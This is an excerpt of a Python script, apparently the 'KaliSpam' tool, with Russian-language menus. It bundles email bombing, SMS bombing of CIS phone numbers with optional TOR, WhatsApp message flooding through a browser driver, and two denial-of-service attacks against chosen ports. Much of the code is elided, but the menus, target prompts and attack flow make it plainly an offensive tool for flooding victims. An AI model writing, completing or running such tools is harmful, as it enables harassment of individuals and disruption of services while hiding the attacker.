...
print(Fore.YELLOW + "Выберите цвет интерфейса")
print(Fore.YELLOW + "1-Зеленый|2-Синий|3-Желтый|4-Красный|")
a=int(input(">> "))
if a == 1:
	b = Fore.GREEN
elif a == 2:
	...
	input()
	exit(0)
print(b + '''        KaliSpam - инструмент для спама и стресс теста
          github.com/KaliSecurityMax/FullSpamAndDDos
	''')
...
def check_internet():
    try:
        ...
        print("Отсутсвует подключение к интернету!")
        input()
        exit(0)
...
def emailbomber():
	...
	class Email_Bomber:
	    ...
	    def __init__(self):
	        try:
	            print('\nЗагрузка скрипта...\n')
	            self.target = str(input('Введите адрес электронной почты вашей цели: '))
	            self.mode = int(input('Выберите уровень атаки (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(на выбор): '))
	    ...
	    def bomb(self):
	        try:
	            ...
	            if self.mode == int(1):
	                ...
	                self.amount = int(input('Выберите кол-во сообщений: '))
	            print(f'\nВы выбрали режим атаки: {self.mode} и {self.amount} почт')
	        except Exception as e:
	            print(f'Ошибка: {e}')
	    ...
	    def email(self):
	        try:
	            ...
	            self.server = str(input('Введите сервер электронной почты | выберите пункт - 1:Gmail 2:Yahoo 3:Outlook 4:Yandex: '))
	            premade = ['1', '2', '3', '4']
	            default_port = True
	            ...
	            self.fromAddr = str(input('Введите Логин: '))
	            self.fromPwd = str(input('Введите Пароль: '))
	            self.subject = str(input('Введите Тему: '))
	            self.message = str(input('Введите сообщение: '))
...
def smsbomber():
	print('''Атака: Спам SMS''')

	print('Введите номер без префиксов или с префиксами (+7) (8):')
	input_number = input(">> ")
	print('Сколько sms нужно отправить?')
	sms = int(input(">> "))

	print(f"Вам нужен TOR y/n?")
	is_tor = input(">> ")


	def parse_number(number):
		msg = f"Проверка номера - OK"
		if len(number) in (10, 11, 12):
			...
			print(f"Номер проверки - ошибка!\nЭтот бомбардировщик предназначен только для стран СНГ")
			quit()
		return number
	...
	if str(is_tor) == "y":
	        ...
	        tor = (tor.replace('\n', ''))
	        print(f"TOR успешно запустился")

	services.attack(number, sms)

def sms_bomber2():
	print('''Атака: SMS (new version)''')

	def main():
	    spam_handler()

	def spam_handler():
	    print("Введите номер без префиксов или с префиксом (+7):")
...
def wbomber():
	print('''Атака: WhatsApp''')

	driver = webdriver.Chrome(ChromeDriverManager().install()) 
	driver.get('https://web.whatsapp.com/')

	name = input('Введите имя пользователя или группы: ')
	msg = input('Введите сообщение: ')
	count = int(input('Введите кол-во сообщений: '))

	input('Введите любой ключ после сканирования QR-кода: ')
...
def doser():
	pb()
	print('''''')
	print("Вы можете прервать атаку, нажав: ctr+z")
	users = [
...
def dosfinal():
	...
	ports = input("Порт (80; 80,8080,443; all): ")
	if ports != "all":
	    ports = (ports+",").split(",")
	    ports.pop()
...
┃1-Email атака                                  ┃
┃2-SMS атака                                    ┃ 
┃3-SMS атака 2 (new version)                    ┃
┃4-WhatsApp атака                               ┃
┃5-Dos атака                                    ┃ 
┃6-Dos атака 2 (new version)                    ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
	''')
ans=int(input(">> "))
